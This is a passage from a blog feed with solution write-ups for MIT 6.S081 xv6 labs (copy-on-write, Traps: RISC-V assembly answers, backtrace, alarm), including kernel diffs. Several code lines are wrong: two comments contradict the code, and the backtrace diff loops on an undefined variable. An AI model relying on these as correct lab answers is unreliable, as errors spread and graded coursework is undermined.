r_stval())) &#123;</span><span class="token prefix inserted">+</span><span class="token line">    if (cowfault(p->pagetable, r_stval()) &lt; 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">      p->killed = 1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  else &#123;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    printf("usertrap(): unexpected scause %p pid=%d\n", r_scause(), p->pid);</span><span class="token prefix unchanged"> </span><span class="token line">    printf("            sepc=%p stval=%p\n", r_sepc(), r_stval());</span><span class="token prefix unchanged"> </span><span class="token line">    p->killed = 1;</span></span>diff --git a/kernel/vm.c b/kernel/vm.cindex d5a12a0..df0ddde 100644<span class="token coord">--- a/kernel/vm.c</span><span class="token coord">+++ b/kernel/vm.c</span>@@ -303,22 +303,20 @@ uvmcopy(pagetable_t old, pagetable_t new, uint64 sz)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  pte_t *pte;</span><span class="token prefix unchanged"> </span><span class="token line">  uint64 pa, i;</span><span class="token prefix unchanged"> </span><span class="token line">  uint flags;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">  char *mem;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">  for(i = 0; i &lt; sz; i += PGSIZE)&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    if((pte = walk(old, i, 0)) == 0)</span><span class="token prefix unchanged"> </span><span class="token line">      panic("uvmcopy: pte should exist");</span><span class="token prefix unchanged"> </span><span class="token line">    if((*pte &amp; PTE_V) == 0)</span><span class="token prefix unchanged"> </span><span class="token line">      panic("uvmcopy: page not present");</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    *pte &amp;= ~PTE_W;   // set write bit</span><span class="token prefix inserted">+</span><span class="token line">    *pte |= PTE_COW;  // clear COW bit</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    pa = PTE2PA(*pte);</span><span class="token prefix unchanged"> </span><span class="token line">    flags = PTE_FLAGS(*pte);</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    if((mem = kalloc()) == 0)</span><span class="token prefix deleted">-</span><span class="token line">      goto err;</span><span class="token prefix deleted">-</span><span class="token line">    memmove(mem, (char*)pa, PGSIZE);</span><span class="token prefix deleted">-</span><span class="token line">    if(mappages(new, i, PGSIZE, (uint64)mem, flags) != 0)&#123;</span><span class="token prefix deleted">-</span><span class="token line">      kfree(mem);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    if(mappages(new, i, PGSIZE, pa, flags) != 0)&#123;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">      goto err;</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    incrfcount((void*)pa); // increment reference count to pa</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line">  return 0;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span>@@ -350,6 +348,9 @@ copyout(pagetable_t pagetable, uint64 dstva, char *src, uint64 len)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">  while(len > 0)&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    va0 = PGROUNDDOWN(dstva);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    if (iscowpage(pagetable, va0)) &#123;</span><span class="token prefix inserted">+</span><span class="token line">      cowfault(pagetable, va0);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    pa0 = walkaddr(pagetable, va0);</span><span class="token prefix unchanged"> </span><span class="token line">    if(pa0 == 0)</span><span class="token prefix unchanged"> </span><span class="token line">      return -1;</span></span>diff --git a/time.txt b/time.txtnew file mode 100644index 0000000..209e3ef<span class="token coord">--- /dev/null</span><span class="token coord">+++ b/time.txt</span><span class="token coord">@@ -0,0 +1 @@</span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">20</span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Implement-copy-on-write&quot;&gt;&lt;a href=&quot;#Implement-copy-on-write&quot; class=&quot;headerlink&quot; title=&quot;Implement copy-on write&quot;&gt;&lt;/a&gt;Implement copy-on</summary>
      
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="xv6" scheme="http://lordaeronesz.github.io/tags/xv6/"/>
    
  </entry>
  
  <entry>
    <title>MIT6.s081 2021 Lab Traps</title>
    <link href="http://lordaeronesz.github.io/2024/07/06/MIT6.s081-2021-Lab%20Traps/"/>
    <id>http://lordaeronesz.github.io/2024/07/06/MIT6.s081-2021-Lab%20Traps/</id>
    <published>2024-07-06T03:45:11.000Z</published>
    <updated>2024-07-07T08:04:10.879Z</updated>
    
    <content type="html"><![CDATA[<h1 id="使用gdb调试xv6内核"><a href="#使用gdb调试xv6内核" class="headerlink" title="使用gdb调试xv6内核"></a>使用gdb调试xv6内核</h1><p>从最近两个 Lab 开始，代码逻辑的复杂度明显上升，对内核进行调试可能是帮助理解操作系统机制的绝佳方法。因此在开始本 Lab 之前，我们先来配置一下针对 xv6 内核的 gdb 调试器。</p><ol><li>安装 <code>gdb-multiarch</code>.</li></ol><p>利用包管理工具进行安装，我使用的是 Ubuntu 系统，执行以下命令：</p><pre class="language-shell" data-language="shell"><code class="language-shell">sudo apt install gdb-multiarch</code></pre><ol start="2"><li>在 xv6 项目根目录下可以看到 <code>.gdbinit</code> 文件，其中已经写好了一些 <code>gdb</code> 的初始化选项，使用文本编辑器或 <code>cat</code> 命令查看：</li></ol><pre class="language-ini" data-language="ini"><code class="language-ini">set confirm off                                                         set architecture riscv:rv64                                             target remote 127.0.0.1:26000                                           symbol-file kernel/kernel                                               set disassemble-next-line auto           set riscv use-compressed-breakpoints yes</code></pre><ol start="3"><li>在 <code>~/.config/gdb/</code> 目录下的文件 <code>gdbinit</code> 中（没有则新建）添加安全加载路径，否则可能无法加载 <code>.gdbinit</code> 的配置。</li></ol><pre class="language-ini" data-language="ini"><code class="language-ini">add-auto-load-safe-path &lt;xv6项目的根目录>/.gdbinit</code></pre><ol start="4"><li>打开两个终端窗口（可以使用 tmux 进行分屏），都需要进入 xv6 根目录，第一个窗口输入 <code>make-qemu</code> 等待调试器连接，第二个窗口输入 <code>gdb-multiarch</code> 打开 <code>gdb</code>，如果前面配置正确，那么 <code>gdb</code> 并自动加载 <code>.gdbinit</code> 配置，与 <code>qemu</code> 连接，之后便可以开始正常调试了。</li></ol><p><img src="/2024/07/06/MIT6.s081-2021-Lab%20Traps/gdb.png"></p><h1 id="RISC-V-assembly"><a href="#RISC-V-assembly" class="headerlink" title="RISC-V assembly"></a>RISC-V assembly</h1><p>一些有关 RISC-V 汇编的问题，最好先通过网上博客或手册简单了解一下 RISC-V 的基本指令。</p><p><strong>Q1:</strong> </p><blockquote><p>Which registers contain arguments to functions? For example, which register holds 13 in main’s call to <code>printf</code>?</p></blockquote><p><strong>A1:</strong> </p><p>可以参考 RISC-V 的 <em>calling convention</em>，<code>a0</code> - <code>a7</code>: 这些寄存器用于传递函数的前八个整数或指针类型的参数，如果超出这些寄存器的数量，超出的部分会存放在栈上。观察指令 <code>li  a2,13</code> 可知，13 作为 <code>printf</code> 的第二个参数，存放在寄存器 <code>a2</code> 中。</p><p><img src="/2024/07/06/MIT6.s081-2021-Lab%20Traps/reg.png"></p><p><strong>Q2:</strong></p><blockquote><p>Where is the call to function <code>f</code> in the assembly code for main? Where is the call to <code>g</code>? (Hint: the compiler may inline functions.)</p></blockquote><p><strong>A2:</strong> </p><p>调用函数 <code>f</code> 和函数 <code>g</code> 的代码被编译器优化，直接计算出了结果 12，作为 <code>printf</code> 的参数存入寄存器 <code>a1</code> 中：</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">26:   45b1                    li  a1,12</code></pre><p><strong>Q3:</strong></p><blockquote><p>At what address is the function <code>printf</code> located?</p></blockquote><p><strong>A3:</strong> </p><p>位于 0x638 地址处。</p><p><strong>Q4:</strong></p><blockquote><p>What value is in the register <code>ra</code> just after the <code>jalr</code> to <code>printf</code> in <code>main</code>?</p></blockquote><p><strong>A4:</strong> 参考 <a href="https://pdos.csail.mit.edu/6.828/2021/readings/riscv-calling.pdf">riscv-calling</a>，<code>ra</code> 用来存储函数调用的返回地址，因此 <code>ra</code> 的值为 <code>jalr    1544(ra)</code> 的后一条指令地址，即 0x38.</p><p><strong>Q5:</strong></p><blockquote><p>Run the following code.</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0x00646c72</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"H%x Wo%s"</span><span class="token punctuation">,</span> <span class="token number">57616</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>What is the output? <a href="http://web.cs.mun.ca/~michael/c/ascii-table.html">Here’s an ASCII table</a> that maps bytes to characters.</p><p>The output depends on that fact that the RISC-V is little-endian. If the RISC-V were instead big-endian what would you set <code>i</code> to in order to yield the same output? Would you need to change <code>57616</code> to a different value?</p><p><a href="http://www.webopedia.com/TERM/b/big_endian.html">Here’s a description of little- and big-endian</a> and <a href="http://www.networksorcery.com/enp/ien/ien137.txt">a more whimsical description</a>.</p></blockquote><p><strong>A5:</strong></p><ul><li><code>%x</code> 用于输出一个无符号十六进制整数。</li><li><code>%s</code> 用于输出一个字符指针所指向的字符串，直到遇到空字符<code>\0</code>为止。</li></ul><p>小端模式下，57616 的 十六进制表示为 e110，<code>&amp;i</code> 首地址开始的字节分别为 <code>0x72, 0x6c, 0x64, 0x0</code>，对应 ASCII 表中的字符为 <code>r, l, d</code>，因此最终输出结果为 <code>He110 World</code>.</p><p>若采取大端模式，<code>i</code> 的值应当替换为 <code>0x726c6400</code>，57616 的值无需改变，因为十六进制的书写规则并没有改变（高位在左，低位在右）。</p><p><strong>Q6:</strong></p><blockquote><p>In the following code, what is going to be printed after <code>&#39;y=&#39;</code>? (note: the answer is not a specific value.) Why does this happen?</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"x=%d y=%d"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></blockquote><p><strong>A6:</strong></p><p>关于可变参数的内容查看 《<em>C Programming Language 2nd Edition</em>》（K&amp;R）的 7.3 节 <em>Variable-length Argument Lists</em>.</p><p>简而言之，这样的操作将引发<strong>未定义行为</strong>，此时 <code>ap</code> 指向了一个未知的内存区域，并将该区域的数据以整型的形式输出。</p><h1 id="Backtrace"><a href="#Backtrace" class="headerlink" title="Backtrace"></a>Backtrace</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>思路其实很简单：对照 <a href="https://pdos.csail.mit.edu/6.828/2021/lec/l-riscv-slides.pdf">lecture notes</a> 给出的栈的结构，从当前栈帧的起始地址 <code>fp</code> 开始，<code>fp - 8</code> 的位置存放着当前函数调用的返回地址（上一次函数调用处的下一条指令地址），即我们 <strong>需要打印</strong> 的地址，<code>fp - 16</code> 的位置存放着上一次函数调用所在栈帧的起始地址，将该地址作为新的 <code>fp</code> 重复上述步骤即可。</p><p><img src="/2024/07/06/MIT6.s081-2021-Lab%20Traps/st.png"></p><p>关键问题是 <strong>什么时候停止</strong> ？可以看到上述 backtrace 的过程就好像是在遍历一个链表，当链表的 <code>next</code> 域为空指针时链表到达末尾，那 traceback 完成后<code>fp</code> 的值应该是什么？为了寻找这个问题的答案，我选择先不设置终止条件，让它一直向上搜索，最后发现，返回地址最终为一个很小的值，这个地址显然不是我们想要的，在此之前应该退出，即本次 traceback 的尽头是 0x80001c92.</p><p><img src="/2024/07/06/MIT6.s081-2021-Lab%20Traps/noterm.png"></p><p>但打印出来的函数调用的返回地址似乎并没有什么规律，因此我又尝试将遍历过程中的栈帧起始地址 <code>fp</code> 打印出来，得到以下结果：</p><p><img src="/2024/07/06/MIT6.s081-2021-Lab%20Traps/pfp.png"></p><p>结合提示：</p><blockquote><p>Xv6 allocates one page for each stack in the xv6 kernel at PAGE-aligned address.</p></blockquote><p>原因就很明显了，在打印第三个返回地址时，此时栈帧起始地址为 0x3fffffa000，注意该地址后 12 二进制数为 0，且页面大小为 4KB，因此该地址位于一个页面的起始地址。又因为 xv6 内核只为每个 <strong>内核栈</strong> 分配一个页面的存储空间，该页面的起始地址按页面大小对齐，所以此时已经到达一个内核栈的顶端，无需继续遍历。</p><p>弄清楚了这些，代码的编写就很简单了：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">backtrace</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"backtrace:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    uint64 fp <span class="token operator">=</span> <span class="token function">r_fp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    uint64 top <span class="token operator">=</span> <span class="token function">PGROUNDUP</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>uint64 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>fp <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        fp <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>uint64 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>fp <span class="token operator">-</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>fp <span class="token operator">&lt;</span> top<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// reach the top of kernel stack</span><span class="token punctuation">&#125;</span></code></pre><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff"><span class="token coord">--- a/kernel/defs.h</span><span class="token coord">+++ b/kernel/defs.h</span>@@ -80,6 +80,7 @@ int             pipewrite(struct pipe*, uint64, int);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">void            printf(char*, ...);</span><span class="token prefix unchanged"> </span><span class="token line">void            panic(char*) __attribute__((noreturn));</span><span class="token prefix unchanged"> </span><span class="token line">void            printfinit(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">voidbacktrace(void); // here</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// proc.c</span><span class="token prefix unchanged"> </span><span class="token line">int             cpuid(void);</span></span>diff --git a/kernel/printf.c b/kernel/printf.cindex e1347de..a068cbd 100644<span class="token coord">--- a/kernel/printf.c</span><span class="token coord">+++ b/kernel/printf.c</span>@@ -114,6 +114,23 @@ printf(char *fmt, ...)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    release(&amp;pr.lock);</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">void backtrace(void) &#123;</span><span class="token prefix inserted">+</span><span class="token line">printf("backtrace:\n");</span><span class="token prefix inserted">+</span><span class="token line">uint64 fp = r_fp();</span><span class="token prefix inserted">+</span><span class="token line">uint64 top = PGROUNDUP(fp);</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">do &#123;</span><span class="token prefix inserted">+</span><span class="token line">printf("%p\n", *(uint64 *)(fp - 8));</span><span class="token prefix inserted">+</span><span class="token line">fp = *(uint64 *)(fp - 16);</span><span class="token prefix inserted">+</span><span class="token line">&#125; while (lower &lt; top);</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">void</span><span class="token prefix unchanged"> </span><span class="token line">panic(char *s)</span><span class="token prefix unchanged"> </span><span class="token line">&#123;</span></span>diff --git a/kernel/riscv.h b/kernel/riscv.hindex 1691faf..fae7bf3 100644<span class="token coord">--- a/kernel/riscv.h</span><span class="token coord">+++ b/kernel/riscv.h</span>@@ -331,6 +331,15 @@ sfence_vma()<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  asm volatile("sfence.vma zero, zero");</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">static inline uint64</span><span class="token prefix inserted">+</span><span class="token line">r_fp()</span><span class="token prefix inserted">+</span><span class="token line">&#123;</span><span class="token prefix inserted">+</span><span class="token line">  uint64 x;</span><span class="token prefix inserted">+</span><span class="token line">  asm volatile("mv %0, s0" : "=r" (x) );</span><span class="token prefix inserted">+</span><span class="token line">  return x;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">#define PGSIZE 4096 // bytes per page</span><span class="token prefix unchanged"> </span><span class="token line">#define PGSHIFT 12  // bits of offset within a page</span></span>diff --git a/kernel/sysproc.c b/kernel/sysproc.cindex e8bcda9..f27c007 100644<span class="token coord">--- a/kernel/sysproc.c</span><span class="token coord">+++ b/kernel/sysproc.c</span>@@ -70,6 +70,7 @@ sys_sleep(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    sleep(&amp;ticks, &amp;tickslock);</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line">  release(&amp;tickslock);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  backtrace(); // here</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  return 0;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span></code></pre><h1 id="Alarm"><a href="#Alarm" class="headerlink" title="Alarm"></a>Alarm</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>目前为止感觉最复杂的一题，需要对 trap 机制有一个比较深入的理解，建议在上手之前先仔细阅读与 trap 有关的代码：<code>kernel/trampoline.S</code> 和 <code>kernel/trap.c</code>，这里也推荐一位博主写的两篇有关 xv6 的 trap 机制的博客：</p><p><a href="https://blog.csdn.net/zzy980511/article/details/130255251">6.S081——陷阱部分(一文读懂xv6系统调用)——xv6源码完全解析系列(5)</a></p><p><a href="https://blog.csdn.net/zzy980511/article/details/130642258">6.S081——补充材料——RISC-V架构中的异常与中断详解</a></p><h3 id="test0-invoke-handler"><a href="#test0-invoke-handler" class="headerlink" title="test0: invoke handler"></a>test0: invoke handler</h3><p>我们不妨按照提示的顺序来进行，不关注 <code>sys_sigreturn</code>，先把 <code>sys_sigalarm</code> 的功能实现。</p><p>实际上，<code>sys_sigalarm</code> 函数的功能很简单，只是简单地将用户态下传递的参数 <code>ticks</code> 和 <code>handler</code> 存入进程的 <code>struct proc</code> 结构体中。实现调用 <code>handler</code> 的操作需要在内核态下的 <code>usertrap</code> 中完成，具体来说，针对时钟中断导致的 trap 将在 <code>if(which_dev == 2)</code> 后的语句中被处理。有两个目标需要完成： <strong>定时</strong> 和 <strong>函数调用</strong> 。</p><p>定时的逻辑比较清楚，在 <code>struct proc</code> 中添加变量 <code>ticksum</code>，代表从上次 <code>handler</code> 处理完成开始进程累计的时钟中断次数，该变量在进程初始化时设置为 0，随后每次遇到时钟中断，都自增 1，如果自增后的值达到了设定的间隔 <code>ticks</code>，则将其复位为 0，调用 <code>handler</code> 函数。</p><p>函数调用是一个需要考虑的问题，这里不能直接利用函数指针 <code>handler</code> 进行函数调用，因为 <code>handler</code> 指向的函数位于用户空间下，而 <code>usertrap</code> 位于内核态下，页表的地址映射不同，无法直接根据用户空间下的虚拟地址进行寻址（直接调用引发的错误如下图所示），需要在本次中断结束返回到用户态之后执行。因此正确的做法应该是设置进程 <code>struct proc</code> 的 <code>epc</code> 寄存器为函数指针 <code>handler</code>，这样在中断处理完成，进程回到用户态并被 CPU 调度执行后，寄存器 <code>pc</code> 将被设置预先保存的 <code>epc</code> 的值，这样函数 <code>handler</code> 就被成功调度执行了。至此，test0 应该成功通过。</p><p><img src="/2024/07/06/MIT6.s081-2021-Lab%20Traps/nil.png"></p><p>在进入到 test1&amp;2 之前，有必要说一说我的一些思考：在上面的讨论中，我们知道内核无法直接根据函数指针 <code>handler</code> 的值进行用户空间函数的调用，那能否在内核态下根据进程的用户态页表和给定的虚拟地址，利用软件地址转换机制（<code>vm.c</code> 中的 <code>walkaddr</code> 函数）来将用户空间的虚拟地址转换为物理地址进行寻址呢（这也是我最开始的想法）？答案是不行，因为即便是在内核态下，程序中的地址仍然是虚拟地址，也就是说即便知道用户态函数实际存储的物理地址，我们也只有在 <strong>给出一个虚拟地址，该虚拟地址经过内核页表地址转换之后，刚好得到了正确的物理地址，</strong> 才可能成功。而实际上，尽管内核 <code>KERNBASE</code> 到 <code>PHYSTOP</code> 地址都是直接映射，但内核页表中可能并没有所需要的页表项，因此，这并不会成功。</p><h3 id="test1-test2-resume-interrupted-code"><a href="#test1-test2-resume-interrupted-code" class="headerlink" title="test1/test2(): resume interrupted code"></a>test1/test2(): resume interrupted code</h3><p>test1 的目标是，存储和恢复中断处理前后的寄存器状态。那么问题就来了：为什么需要存储这些寄存器？需要存储哪些寄存器？</p><p>其实最开始，我是有些纠结寄存器状态的存储目的是什么，认为可能是与内核态和用户态切换有关，但仔细想想，这部分的工作应该是由 <code>trampoline.S</code> 和 <code>usertrapret</code> 来完成的，那么为什么还需要存储和恢复寄存器？</p><p>事实上，在系统未关闭中断的情况下，时钟中断可能在程序执行的任何时刻发生，且在返回到原程序位置继续执行之前还需要执行预先设定好的 <code>handler</code> 函数，那么寄存器状态的保存将是必要的。一方面在执行 <code>handler</code> 函数期间，如果 <code>handler</code> 函数包含一些对局部变量的处理，那么通用寄存器的值将会发生改变，从而使得中断返回时程序的执行结果与预期不符；另一方面，由于 <code>epc</code> 的值被手动改变，如果执行完 <code>handler</code> 之后不恢复中断发生时的保存的 <code>pc</code> 值，那么 <code>pc</code> 将会指向 <code>handler</code> 函数末尾的下一条指令，中断因此无法正常返回。 简单来说，这部分的操作相当于手动模拟了 <strong>线程</strong> 的切换。</p><p>另一个问题是：需要存储哪些寄存器？好吧，在解决这个 Lab 时我其实偷了点懒，没有去仔细琢磨，只是简单地将整个 <code>trapframe</code> 中所有的寄存器都保存下来。但根据上面的讨论，再结合 RISC-V 的 <em>calling convention</em>，应该不难得出答案。</p><p>最后的 test2 就比较简单了，目标是：</p><blockquote><p>Prevent re-entrant calls to the handler—-if a handler hasn’t returned yet, the kernel shouldn’t call it again.</p></blockquote><p>解决的办法有很多，可以额外在 <code>strcut proc</code> 添加一个变量，用来表示进程当前是否正处在处理 <code>handler</code> 的过程中，如果是，则不进行 <code>ticksum</code> 的自增操作。这里我采用了一点 <strong>小技巧</strong> ：不添加额外的变量，而是在处理 <code>handler</code> 前将 <code>ticksum</code> 置为负数，并在自增前判断 <code>ticksum</code> 是否非负，在 <code>sys_sigreturn</code> 时再将它置为 0，本质上与添加变量的操作大差不差。</p><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/Makefile b/Makefileindex 7a7e380..bc4d47a 100644<span class="token coord">--- a/Makefile</span><span class="token coord">+++ b/Makefile</span>@@ -188,6 +188,7 @@ UPROGS=\<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">$U/_grind\</span><span class="token prefix unchanged"> </span><span class="token line">$U/_wc\</span><span class="token prefix unchanged"> </span><span class="token line">$U/_zombie\</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">$U/_alarmtest\</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span></span>diff --git a/kernel/proc.c b/kernel/proc.cindex 22e7ce4..80096f7 100644<span class="token coord">--- a/kernel/proc.c</span><span class="token coord">+++ b/kernel/proc.c</span>@@ -119,6 +119,7 @@ allocproc(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">found:</span><span class="token prefix unchanged"> </span><span class="token line">  p->pid = allocpid();</span><span class="token prefix unchanged"> </span><span class="token line">  p->state = USED;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  p->ticksum = 0; // here</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">  // Allocate a trapframe page.</span><span class="token prefix unchanged"> </span><span class="token line">  if((p->trapframe = (struct trapframe *)kalloc()) == 0)&#123;</span></span>diff --git a/kernel/proc.h b/kernel/proc.hindex f6ca8b7..c1d5a23 100644<span class="token coord">--- a/kernel/proc.h</span><span class="token coord">+++ b/kernel/proc.h</span>@@ -105,4 +105,10 @@ struct proc &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  struct file *ofile[NOFILE];  // Open files</span><span class="token prefix unchanged"> </span><span class="token line">  struct inode *cwd;           // Current directory</span><span class="token prefix unchanged"> </span><span class="token line">  char name[16];               // Process name (debugging)</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  int ticks;         // here</span><span class="token prefix inserted">+</span><span class="token line">  void (*handler)();</span><span class="token prefix inserted">+</span><span class="token line">  int ticksum;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  struct trapframe strapframe;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span></span>diff --git a/kernel/syscall.c b/kernel/syscall.cindex c1b3670..d4e5585 100644<span class="token coord">--- a/kernel/syscall.c</span><span class="token coord">+++ b/kernel/syscall.c</span>@@ -104,6 +104,8 @@ extern uint64 sys_unlink(void);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_wait(void);</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_write(void);</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_uptime(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">extern uint64 sys_sigalarm(void); // here</span><span class="token prefix inserted">+</span><span class="token line">extern uint64 sys_sigreturn(void);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">static uint64 (*syscalls[])(void) = &#123;</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_fork]    sys_fork,</span></span>@@ -127,6 +129,8 @@ static uint64 (*syscalls[])(void) = &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">[SYS_link]    sys_link,</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_mkdir]   sys_mkdir,</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_close]   sys_close,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">[SYS_sigalarm]  sys_sigalarm,  // here</span><span class="token prefix inserted">+</span><span class="token line">[SYS_sigreturn] sys_sigreturn,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">void</span></span>diff --git a/kernel/syscall.h b/kernel/syscall.hindex bc5f356..a040610 100644<span class="token coord">--- a/kernel/syscall.h</span><span class="token coord">+++ b/kernel/syscall.h</span><span class="token coord">@@ -20,3 +20,5 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define SYS_link   19</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_mkdir  20</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_close  21</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define SYS_sigalarm  22  // here</span><span class="token prefix inserted">+</span><span class="token line">#define SYS_sigreturn 23</span></span>diff --git a/kernel/sysproc.c b/kernel/sysproc.cindex f27c007..ee859ed 100644<span class="token coord">--- a/kernel/sysproc.c</span><span class="token coord">+++ b/kernel/sysproc.c</span>@@ -96,3 +96,28 @@ sys_uptime(void)<span class="token 